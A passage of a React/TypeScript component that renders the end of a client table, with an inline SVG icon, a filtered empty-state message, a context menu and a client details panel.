                                        stroke-width="0"
                                      ></g>
                                      <g
                                        id="SVGRepo_tracerCarrier"
                                        stroke-linecap="round"
                                        stroke-linejoin="round"
                                      ></g>
                                      <g id="SVGRepo_iconCarrier">
                                        {" "}
                                        <path d="M168.998,200c6.816,0,12.363-5.546,12.363-12.362V12.362C181.361,5.546,175.814,0,168.998,0H31.002 c-6.817,0-12.363,5.546-12.363,12.362v175.275c0,6.816,5.547,12.362,12.363,12.362h76.332v-8.667H150V200H168.998z M161.666,15.544 c3.498,0,6.334,2.835,6.334,6.333c0,3.498-2.836,6.333-6.334,6.333c-3.497,0-6.332-2.835-6.332-6.333 C155.334,18.379,158.169,15.544,161.666,15.544z M161.666,171.79c3.498,0,6.334,2.835,6.334,6.333c0,3.498-2.836,6.333-6.334,6.333 c-3.497,0-6.332-2.835-6.332-6.333C155.334,174.625,158.169,171.79,161.666,171.79z M38.334,184.456 c-3.498,0-6.334-2.835-6.334-6.333c0-3.498,2.836-6.333,6.334-6.333c3.497,0,6.332,2.835,6.332,6.333 C44.666,181.621,41.831,184.456,38.334,184.456z M38.334,28.21c-3.498,0-6.334-2.835-6.334-6.333c0-3.498,2.836-6.333,6.334-6.333 c3.497,0,6.332,2.835,6.332,6.333C44.666,25.375,41.831,28.21,38.334,28.21z M100,145.249c-4.276,0-8.432-0.504-12.427-1.427 c1.43,7.246,2.381,12.935,2.381,15.256c0,11.096-9.027,20.122-20.122,20.122c-11.095,0-20.122-9.026-20.122-20.122 c0-4.238,3.164-19.688,6.642-35.381C49.238,114.429,45,102.836,45,90.249c0-30.377,24.625-55,55-55s55,24.623,55,55 C155,120.626,130.375,145.249,100,145.249z M122,90.249c0,12.15-9.851,22-22,22c-12.149,0-22-9.85-22-22s9.851-22,22-22 C112.149,68.249,122,78.099,122,90.249z M54.832,159.078c0,8.284,6.716,15,15,15c8.284,0,15-6.716,15-15 c0-8.285-15-70.976-15-70.976S54.832,150.793,54.832,159.078z M75.686,159.078c0,3.232-2.62,5.854-5.853,5.854 c-3.233,0-5.854-2.621-5.854-5.854c0-3.233,2.62-5.854,5.854-5.854C73.065,153.224,75.686,155.845,75.686,159.078z"></path>{" "}
                                      </g>
                                    </svg>
                                  </div>
                                </div>
                              </td>
                            </tr>
                          ))}
                        </>
                      ) : (
                        <tr>
                          <td
                            colSpan={6}
                            className="px-6 py-10 text-center text-white"
                          >
                            {searchTerm ||
                            (
                              Object.values(filters) as Record<
                                string,
                                boolean
                              >[]
                            ).some((category) =>
                              Object.values(category).includes(false)
                            )
                              ? "No clients match the current filters"
                              : "No clients available"}
                          </td>
                        </tr>
                      )}
                    </tbody>
                  </table>
                  {contextMenu && (
                    <ContextMenu
                      x={contextMenu.x}
                      y={contextMenu.y}
                      addr={contextMenu.addr}
                      onClose={handleClose}
                      clientFullName={contextMenu.clientFullName}
                    />
                  )}
                </div>
              </div>
            </div>
          </div>

          {/* Details panel */}
          <div
            className={`w-100 px-2 h-full ${
              selectedClientDetails ? "block" : "hidden"
            }`}
          >
            {selectedClientDetails && (
              <ClientDetails
                client={selectedClientDetails}
                onClose={() => setSelectedClientDetails(null)}
              />
            )}
          </div>
        </div>
      </div>
    </>
  );
};
